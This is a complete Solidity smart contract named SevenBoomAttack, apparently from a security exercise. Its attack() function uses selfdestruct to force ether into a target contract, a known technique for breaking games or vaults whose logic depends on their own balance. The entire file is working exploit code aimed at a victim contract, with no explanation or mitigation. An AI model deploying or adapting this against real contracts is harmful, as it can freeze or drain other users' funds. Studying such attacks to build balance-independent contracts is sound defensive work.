// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


contract SevenBoomAttack {
    address sevenBoom;

    constructor(address _sevenBoom) {
        sevenBoom = _sevenBoom;
    }

    function attack() public payable {
        // cast address to payable
        selfdestruct(payable(address(sevenBoom)));
    }
}